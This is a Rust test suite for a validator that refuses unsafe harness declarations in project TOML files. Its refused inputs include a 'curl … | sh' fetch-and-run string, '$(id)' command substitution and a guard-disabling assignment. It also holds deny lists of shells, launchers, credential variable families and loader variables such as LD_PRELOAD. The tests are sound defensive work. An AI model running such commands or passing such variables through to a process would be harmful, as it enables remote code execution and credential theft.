//! Harness declarations (ADR 0073, FD-14): what a project's `harnesses/<name>.toml` declares,
//! what charter refuses in one, and the built-ins read by the same reader. Every expected answer
//! is written out.

use super::*;

/// A project with `harnesses/<file>` holding `text`.
fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(DIR)).unwrap();
    for (file, text) in files {
        std::fs::write(dir.path().join(DIR).join(file), text).unwrap();
    }
    dir
}

const GEMINI: &str = r#"
name = "gemini"
title = "Gemini CLI"
program = "gemini"
env = ["GEMCLI_*"]
tested = ">=0.9, <0.12"

[session]
chosen_by = "harness"
resume = ["--resume={id}"]
named_by = ["--resume", "-r"]

[terminal]
newline = "\u001b\r"
paste_drawn_whole = { lines = 2, chars = 150 }
ready_to_type = "never"

[levels]
terminal = true
hooks = false
acp = ["gemini", "--experimental-acp"]

[capabilities]
reports_waiting = "no: it has no hook for a pending approval"
resumes_by_id = "yes"
"#;

#[test]
fn a_harness_a_project_declares_is_read_with_every_field_it_gave() {
    let dir = project(&[("gemini.toml", GEMINI)]);

    let read = read(dir.path());

    assert_eq!(read.refused, Vec::<Refused>::new());
    let gemini = read.get("gemini").expect("gemini is declared");
    assert_eq!(gemini.title, "Gemini CLI");
    assert_eq!(gemini.program, "gemini");
    assert_eq!(gemini.env, vec!["GEMCLI_*".to_owned()]);
    assert_eq!(gemini.tested.as_deref(), Some(">=0.9, <0.12"));
    assert_eq!(gemini.origin, Origin::Project);
    assert_eq!(gemini.session.chosen_by, ChosenBy::Harness);
    assert_eq!(gemini.terminal.newline.as_deref(), Some("\x1b\r"));
    assert_eq!(
        gemini.terminal.paste_drawn_whole,
        Some(DrawnWhole {
            lines: 2,
            chars: 150
        })
    );
    assert_eq!(gemini.terminal.ready_to_type, ReadyToType::Never);
    assert!(gemini.levels.terminal);
    assert!(!gemini.levels.hooks);
    assert_eq!(
        gemini.levels.acp,
        Some(vec!["gemini".to_owned(), "--experimental-acp".to_owned()])
    );
    assert_eq!(
        gemini.capability("reports_waiting"),
        Answer::No("it has no hook for a pending approval".to_owned())
    );
    assert_eq!(gemini.capability("resumes_by_id"), Answer::Yes);
}

/// The one sentence `text`, as `harnesses/<name>.toml`, is refused with.
fn refused(name: &str, text: &str) -> String {
    let dir = project(&[(&format!("{name}.toml"), text)]);
    let read = read(dir.path());
    assert!(read.get(name).is_none() || read.get(name).unwrap().origin == Origin::BuiltIn);
    assert_eq!(read.refused.len(), 1, "{:?}", read.refused);
    assert_eq!(read.refused[0].file, format!("harnesses/{name}.toml"));
    read.refused[0].reason.clone()
}

#[test]
fn the_least_a_terminal_only_harness_declares_is_its_name_and_its_program() {
    let dir = project(&[("aider.toml", "name = \"aider\"\nprogram = \"aider\"\n")]);

    let aider = read(dir.path()).get("aider").cloned().expect("declared");

    assert_eq!(aider.title, "aider");
    assert_eq!(aider.session.chosen_by, ChosenBy::Harness);
    assert_eq!(aider.session.resume, None);
    assert_eq!(aider.terminal.ready_to_type, ReadyToType::Never);
    assert!(aider.levels.terminal && !aider.levels.hooks && !aider.has_adapter());
    // Silence never reads as yes.
    assert_eq!(aider.capability("reports_waiting"), Answer::Unknown);
    assert!(!aider.capability("reports_waiting").holds());
}

#[test]
fn a_program_is_a_bare_name_and_never_a_path_or_a_shell_string() {
    for program in [
        "/usr/bin/gemini",
        "./gemini",
        "~/bin/gemini",
        "gemini --yolo",
        "-x",
        "",
    ] {
        let why = refused(
            "gemini",
            &format!("name = \"gemini\"\nprogram = {program:?}\n"),
        );
        assert!(why.contains("not a bare program name"), "{program}: {why}");
    }
}

#[test]
fn a_template_takes_id_and_name_and_nothing_else() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nresume = [\"--resume={home}\"]\n",
    );
    assert!(why.contains("a placeholder charter does not fill"), "{why}");
}

#[test]
fn a_session_charter_chooses_hands_its_id_over_and_one_the_harness_chooses_does_not() {
    let charter = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nchosen_by = \"charter\"\n",
    );
    assert!(charter.contains("hands over no {id}"), "{charter}");
    let harness = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nnew = [\"--id={id}\"]\n",
    );
    assert!(harness.contains("chosen_by is \"harness\""), "{harness}");
}

#[test]
fn a_resume_template_names_the_id_it_resumes() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nresume = [\"--continue\"]\n",
    );
    assert!(why.contains("names no {id}"), "{why}");
}

#[test]
fn the_environment_is_the_harnesss_own_namespace_and_never_charters_or_a_credential() {
    for (entry, said) in [
        ("CHARTER_*", "charter's own variables"),
        // The product's variables under either name (RN-2d): `PURLIS_*` is the canonical one.
        ("PURLIS_*", "charter's own variables"),
        ("PURLIS_ROOT", "charter's own variables"),
        ("PUR*", "capitals, digits and '_'"),
        ("CHA*", "capitals, digits and '_'"),
        ("C*", "capitals, digits and '_'"),
        ("GEMINI_API_KEY", "named like a credential"),
        ("GEMINI_TOKEN_*", "named like a credential"),
        ("*", "capitals, digits and '_'"),
        ("gemini_*", "capitals, digits and '_'"),
    ] {
        let why = refused(
            "gemini",
            &format!("name = \"gemini\"\nprogram = \"gemini\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains(said), "{entry}: {why}");
    }
}

#[test]
fn a_project_declaration_cannot_say_it_has_hooks() {
    // V24c: level 2 always needs charter code.
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[levels]\nhooks = true\n",
    );
    assert!(
        why.contains("level 2 needs an adapter charter ships"),
        "{why}"
    );
}

#[test]
fn a_harness_with_no_hooks_cannot_wait_for_one_to_be_typed_into() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[terminal]\nready_to_type = \"on-start\"\n",
    );
    assert!(why.contains("waits for a hook"), "{why}");
}

#[test]
fn a_capability_is_yes_no_with_a_reason_or_unknown() {
    let bare_no = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[capabilities]\nreports_waiting = \"no\"\n",
    );
    assert!(bare_no.contains("\"no: <the reason>\""), "{bare_no}");
    let unknown_key = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[capabilities]\nreports_wating = \"yes\"\n",
    );
    assert!(
        unknown_key.contains("not a harness capability charter reads"),
        "{unknown_key}"
    );
    let resumes = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[capabilities]\nresumes_by_id = \"yes\"\n",
    );
    assert!(resumes.contains("has no resume"), "{resumes}");
}

#[test]
fn a_key_charter_does_not_read_refuses_the_declaration() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\ncommand = \"gemini --yolo\"\n",
    );
    assert!(
        why.contains("not a harness declaration charter reads"),
        "{why}"
    );
}

#[test]
fn a_file_is_named_after_the_harness_it_declares() {
    let dir = project(&[("gemini.toml", "name = \"other\"\nprogram = \"gemini\"\n")]);
    let read = read(dir.path());
    assert!(read.get("other").is_none() && read.get("gemini").is_none());
    assert!(
        read.refused[0]
            .reason
            .contains("Rename the file other.toml"),
        "{:?}",
        read.refused
    );
}

#[test]
fn a_project_never_takes_a_built_ins_name() {
    // ADR 0073 §5: a built-in's declaration decides how its chats are armed.
    let why = refused("claude", "name = \"claude\"\nprogram = \"my-claude\"\n");
    assert!(why.contains("a harness charter ships"), "{why}");
    let read = read(project(&[("claude.toml", "name = \"claude\"\nprogram = \"x\"\n")]).path());
    assert_eq!(read.get("claude").unwrap().program, "claude");
}

#[test]
fn a_file_that_is_not_toml_is_not_a_declaration_and_a_link_is_not_followed() {
    let dir = project(&[("README.md", "# harnesses\n")]);
    let elsewhere = tempfile::tempdir().unwrap();
    std::fs::write(
        elsewhere.path().join("x.toml"),
        "name = \"x\"\nprogram = \"x\"\n",
    )
    .unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(
        elsewhere.path().join("x.toml"),
        dir.path().join(DIR).join("x.toml"),
    )
    .unwrap();

    let read = read(dir.path());

    assert!(read.get("x").is_none());
    #[cfg(unix)]
    assert!(
        read.refused[0].reason.contains("could not be read"),
        "{:?}",
        read.refused
    );
}

#[test]
fn a_project_with_no_harnesses_directory_has_the_built_ins_and_nothing_refused() {
    let dir = tempfile::tempdir().unwrap();
    let read = read(dir.path());
    let names: Vec<&str> = read.declared.iter().map(|d| d.name.as_str()).collect();
    assert_eq!(names, ["claude", "opencode", "codex"]);
    assert!(read.refused.is_empty());
}

#[test]
fn a_declaration_fills_its_templates_and_knows_the_operators_own_session_flags() {
    let dir = project(&[(
        "gemini.toml",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nchosen_by = \"charter\"\nnew = [\"--session={id}\", \"--title={name}\"]\nresume = [\"--resume={id}\"]\nnamed_by = [\"--resume\"]\n",
    )]);
    let gemini = read(dir.path()).get("gemini").cloned().unwrap();
    let id = SessionId::new("abc-1").unwrap();

    assert_eq!(
        gemini.new_session_argv(&id, "ide.7"),
        ["--session=abc-1", "--title=ide.7"]
    );
    assert_eq!(
        gemini.resume_argv(&id, "ide.7"),
        Some(vec!["--resume=abc-1".to_owned()])
    );
    assert!(gemini.session_named_in(&["--resume=x".to_owned()]));
    assert!(!gemini.session_named_in(&["--resume-later".to_owned()]));
}

#[test]
fn an_approval_is_of_the_bytes_so_any_change_is_a_new_digest() {
    let one = parse(
        "name = \"a\"\nprogram = \"a\"\n",
        Origin::Project,
        "harnesses/a.toml",
    )
    .unwrap();
    let two = parse(
        "name = \"a\"\nprogram = \"a\"\n\n",
        Origin::Project,
        "harnesses/a.toml",
    )
    .unwrap();
    assert!(one.digest.starts_with("sha256:"));
    assert_ne!(one.digest, two.digest);
}

/// The built-ins are declarations, and until `Harness` reads them (after FD-13's registry,
/// #921) every fact they hold is the one `Harness` answers. Each value on the right is the
/// measured one, cited in `harness.rs`.
#[test]
fn every_built_in_declaration_says_what_harness_measured() {
    use crate::harness::{Harness, ReadyToType as Measured};
    let id = SessionId::new("11111111-2222-4333-8444-555555555555").unwrap();
    for harness in Harness::ALL {
        let d = builtin(harness.name()).expect("a declaration per harness");
        let who = harness.name();
        assert_eq!(d.origin, Origin::BuiltIn);
        assert_eq!(d.title, harness.title(), "{who}");
        assert_eq!(d.env, harness.env_passed(), "{who}");
        assert_eq!(
            d.session.chosen_by == ChosenBy::Charter,
            harness.chooses_session_id(),
            "{who}"
        );
        assert_eq!(
            d.new_session_argv(&id, "ide.7"),
            harness.new_session_argv(&id, "ide.7"),
            "{who}"
        );
        assert_eq!(
            d.resume_argv(&id, "ide.7"),
            harness.resume_argv(&id, "ide.7"),
            "{who}"
        );
        for word in &d.session.named_by {
            assert!(
                harness.session_named_in(std::slice::from_ref(word)),
                "{who}: {word}"
            );
        }
        for word in ["--resume", "resume", "-s", "--session-id", "fork", "-c"] {
            assert_eq!(
                d.session_named_in(&[word.to_owned()]),
                harness.session_named_in(&[word.to_owned()]),
                "{who}: {word}"
            );
        }
        assert_eq!(
            d.terminal.newline.as_deref(),
            Some(harness.newline()),
            "{who}"
        );
        assert_eq!(
            d.terminal.paste_drawn_whole,
            Some(harness.longest_paste_drawn_whole()),
            "{who}"
        );
        let ready = match harness.ready_to_type() {
            Some(Measured::WhenItReportsItsStart) => ReadyToType::OnStart,
            Some(Measured::WhenRawAndQuiet) => ReadyToType::RawAndQuiet,
            None => ReadyToType::Never,
        };
        assert_eq!(d.terminal.ready_to_type, ready, "{who}");
        // HP-2: the ACP agent `Harness::acp_args` starts, after the harness's own program.
        let acp = harness.acp_args().map(|args| {
            std::iter::once(harness.name().to_owned())
                .chain(args.iter().map(|arg| (*arg).to_owned()))
                .collect::<Vec<_>>()
        });
        assert_eq!(d.levels.acp, acp, "{who}");
        assert_eq!(
            d.capability("reports_its_process").holds(),
            harness.reports_its_process(),
            "{who}"
        );
        assert_eq!(
            d.capability("reports_its_start_before_the_first_prompt")
                .holds(),
            harness.reports_its_start_before_the_first_prompt(),
            "{who}"
        );
        assert_eq!(
            d.capability("keeps_conversations_by_directory").holds(),
            harness.keeps_conversations_by_directory(),
            "{who}"
        );
        assert!(d.capability("resumes_by_id").holds(), "{who}");
        assert!(d.has_adapter(), "{who}");
        let kind = crate::profiles::KINDS
            .iter()
            .find(|k| k.word == who)
            .expect("a kind per harness");
        assert_eq!(d.program, kind.binary, "{who}");
        assert_eq!(d.login.as_deref(), Some(kind.login()), "{who}");
    }
    // In the order profiles' registry lists them.
    let names: Vec<&str> = builtins().iter().map(|d| d.name.as_str()).collect();
    let kinds: Vec<&str> = crate::profiles::KINDS.iter().map(|k| k.word).collect();
    assert_eq!(names, kinds);
}

#[test]
fn a_template_word_is_a_plain_flag_or_value_and_never_a_path_an_assignment_or_a_script() {
    // Ruling V66: every word here is appended to a program's command line on a click.
    for (word, said) in [
        ("curl e.example | sh; : {id}", "shell syntax"),
        ("curl https://e.example/x", "is a path"),
        ("$(id)", "shell syntax"),
        ("CHARTER_GUARD=off", "VAR=value"),
        ("/tmp/evil", "is a path"),
        ("~/evil", "is a path"),
        ("./evil.js", "is a path"),
        ("{name}", "starts with {name}"),
        ("{name}-x", "starts with {name}"),
    ] {
        let why = refused(
            "aider",
            &format!(
                "name = \"aider\"\nprogram = \"aider\"\n[session]\nchosen_by = \"charter\"\nnew = [{word:?}, \"{{id}}\"]\n"
            ),
        );
        assert!(why.contains(said), "{word}: {why}");
    }
    // A flag with its value attached, and `{name}` inside a word, are plain.
    let dir = project(&[(
        "aider.toml",
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nchosen_by = \"charter\"\nnew = [\"--session={id}\", \"--title=chat-{name}\"]\n",
    )]);
    assert!(read(dir.path()).get("aider").is_some());
}

#[test]
fn the_product_itself_is_never_a_declarations_program_by_any_of_its_names() {
    // It runs whatever its arguments say (`secret exec`, an extension's command), so it is a
    // launcher as much as `env` is — under the name it ships as and the ones it had (RN-3).
    for program in ["purlis", "PURLIS", "charter", "edm"] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher"),
            "{program}: {why}"
        );
    }
}

#[test]
fn a_shell_an_interpreter_a_launcher_or_a_built_ins_program_is_never_a_declarations_program() {
    for program in [
        "sh",
        "bash",
        "zsh",
        "fish",
        "dash",
        "env",
        "node",
        "python3",
        "python3.12",
        "perl",
        "ruby",
        "deno",
        "bun",
        "npx",
        "uvx",
        "osascript",
        "SH",
        "claude",
        "codex",
        "opencode",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher") || why.contains("a harness charter ships"),
            "{program}: {why}"
        );
    }
}

#[test]
fn an_acp_command_takes_the_same_rules_as_a_program_and_its_templates() {
    for acp in [
        r#"["node", "agent.js"]"#,
        r#"["aider-acp", "/tmp/x"]"#,
        r#"["aider-acp", "A=b"]"#,
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\n[levels]\nacp = {acp}\n"),
        );
        assert!(why.contains("[levels] acp"), "{acp}: {why}");
    }
}

#[test]
fn a_namespace_never_reaches_a_family_of_credentials_or_what_a_process_loads() {
    for entry in [
        "AWS_*",
        "GITHUB_*",
        "GITHUB_TOKEN",
        "OPENAI_*",
        "ANTHROPIC_*",
        "GOOGLE_*",
        "AZURE_*",
        "GEMINI_*",
        "KUBECONFIG",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains("family of credentials"), "{entry}: {why}");
    }
    for entry in [
        "LD_*",
        "LD_PRELOAD",
        "DYLD_*",
        "NODE_OPTIONS",
        "PYTHONPATH",
        "PATH",
        "GIT_*",
        "GIT_SSH_COMMAND",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains("loads, runs or finds"), "{entry}: {why}");
    }
}

/// `new` holding `words` (TOML array items), in a project's declaration.
fn with_new(words: &str) -> String {
    format!(
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nchosen_by = \"charter\"\nnew = [{words}, \"--session={{id}}\"]\n"
    )
}

#[test]
fn every_word_after_the_program_has_an_allowed_shape_and_nothing_else_is_taken() {
    // Ruling V66c: a flag, `--flag=<plain value>`, a placeholder inside a flag's value, or a
    // lowercase subcommand with no dot. The second review's probes, each refused.
    for word in [
        "/tmp/a",
        "CHARTER_X=off",
        "a;b",
        "{name}",
        "-{name}",
        "--{name}",
        "{id}{name}",
        "{id}",
        "--flag=/abs",
        "--cfg=~/x",
        "--x=..",
        "--cfg=.hidden",
        "--a=b@c",
        "rel.js",
        "-I.",
        "-c.foo",
        "@args.txt",
        "file:rel",
        "%2F",
        "Exec",
        "--=x",
        "--x=",
        "sh",
        "claude",
        "--exec=sh",
        "--run=python3",
    ] {
        let why = refused("aider", &with_new(&format!("{word:?}")));
        assert!(why.contains("[session] new holds"), "{word}: {why}");
    }
    for word in [
        "-c",
        "--yolo",
        "--title={name}",
        "--cfg=rel.toml",
        "--remote=example.com:8080",
        "--u=http:x",
        "exec",
        "run",
        "resume",
        "2fa",
    ] {
        let dir = project(&[("aider.toml", &with_new(&format!("{word:?}")))]);
        let read = read(dir.path());
        assert!(read.get("aider").is_some(), "{word}: {:?}", read.refused);
    }
}

#[test]
fn a_resume_and_an_acp_command_take_the_same_shapes() {
    let resume = refused(
        "aider",
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nresume = [\"--resume\", \"{id}\"]\n",
    );
    assert!(resume.contains("[session] resume holds"), "{resume}");
    for acp in [
        r#"["aider", "/a"]"#,
        r#"["aider", "{name}"]"#,
        r#"["aider", "rel.js"]"#,
        r#"["aider", "sh"]"#,
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\n[levels]\nacp = {acp}\n"),
        );
        assert!(why.contains("[levels] acp"), "{acp}: {why}");
    }
    let dir = project(&[(
        "aider.toml",
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nresume = [\"--resume={id}\"]\n[levels]\nacp = [\"aider\", \"acp\", \"--stdio\"]\n",
    )]);
    assert!(read(dir.path()).get("aider").is_some());
}

#[test]
fn the_launchers_the_second_review_found_are_refused_as_a_program() {
    for program in [
        "arch",
        "caffeinate",
        "xcrun",
        "stdbuf",
        "chrt",
        "taskset",
        "strace",
        "sandbox-exec",
        "tmux",
        "screen",
        "go",
        "cargo",
        "swift",
        "Rscript",
        "julia",
        "gdb",
        "lldb",
        "vim",
        "emacs",
        "git",
        "just",
        "bundle",
        "rake",
        "poetry",
        "pipenv",
        "conda",
        "mise",
        "asdf",
        "direnv",
        "tsx",
        "ts-node",
        "qjs",
        "jshell",
        "groovy",
        "scala",
        "kotlin",
        "elixir",
        "erl",
        "ghci",
        "racket",
        "guile",
        "sbcl",
        "ocaml",
        "dotnet",
        "bunx",
        "corepack",
        "volta",
        "fnm",
        "nvm",
        "rbenv",
        "pyenv",
        "find",
        "ex",
        "zx",
        "nushell",
        "ion",
        "rc",
        "yash",
        "osh",
        "oil",
        "pwsh-preview",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher"),
            "{program}: {why}"
        );
    }
}

#[test]
fn a_flags_value_takes_no_percent_sign_and_no_drive_letter() {
    // Some programs decode `%2F` into a path, or read `C:` as a drive. No measured harness
    // passes a `%`, so the value charset has none.
    for word in [
        "--x=%2F",
        "--x=%2f",
        "--x=%5C",
        "--x=%5c",
        "--x=%2E",
        "--x=%2e",
        "--n=10%",
        "--x=C:",
        "--x=c:foo",
        "--x=Z:rel",
    ] {
        let why = refused("aider", &with_new(&format!("{word:?}")));
        assert!(why.contains("[session] new holds"), "{word}: {why}");
    }
    let dir = project(&[("aider.toml", &with_new("\"--remote=example.com:8080\""))]);
    assert!(read(dir.path()).get("aider").is_some());
}

/// A declaration whose `field = value` line is the TOML `line`, under `[table]` when it is one.
fn declaring(line: &str) -> String {
    format!("name = \"gemini\"\nprogram = \"gemini\"\n{line}\n")
}

#[test]
fn a_title_a_window_draws_is_one_short_line_with_nothing_invisible_in_it() {
    // HP-19: the title is the card's label, on the picker and the tab strip.
    for (line, what) in [
        ("title = \"Gem\\u202Eini\"", "a bidi override"),
        ("title = \"Gem\\u200Bini\"", "a zero-width space"),
        ("title = \"Gem\\u001b[31mini\"", "an escape"),
        ("title = \"\"\"Gem\nini\"\"\"", "a newline"),
        (&format!("title = \"{}\"", "G".repeat(61)), "61 characters"),
    ] {
        let why = refused("gemini", &declaring(line));
        assert!(
            why.starts_with("harnesses/gemini.toml's title")
                && why.contains("one line of at most 60 characters"),
            "{what}: {why}"
        );
    }
    let fine = project(&[(
        "gemini.toml",
        &declaring(&format!("title = \"{}\"", "G".repeat(60))),
    )]);
    assert!(read(fine.path()).refused.is_empty());
}

#[test]
fn a_project_title_may_not_be_a_harness_charter_ships() {
    let why = refused("gemini", &declaring("title = \"claude code\""));
    assert!(
        why.starts_with("harnesses/gemini.toml's title") && why.contains("charter ships"),
        "{why}"
    );
}

#[test]
fn the_versions_a_declaration_was_measured_on_are_one_short_line() {
    for line in [
        "tested = \"1.0\\u2066\"".to_owned(),
        format!("tested = \"{}\"", "1".repeat(81)),
    ] {
        let why = refused("gemini", &declaring(&line));
        assert!(
            why.starts_with("harnesses/gemini.toml's tested")
                && why.contains("one line of at most 80 characters"),
            "{line}: {why}"
        );
    }
}

#[test]
fn a_no_s_reason_is_one_line_of_at_most_200_characters() {
    for (reason, what) in [
        ("it\\nhas none".to_owned(), "a newline"),
        ("it has \\u202Enone".to_owned(), "a bidi override"),
        ("x".repeat(10_000), "10 KB"),
    ] {
        let why = refused(
            "gemini",
            &declaring(&format!(
                "[capabilities]\nreports_waiting = \"no: {reason}\""
            )),
        );
        assert!(
            why.starts_with("harnesses/gemini.toml's [capabilities] reports_waiting")
                && why.contains("one line of at most 200 characters"),
            "{what}: {why}"
        );
    }
}
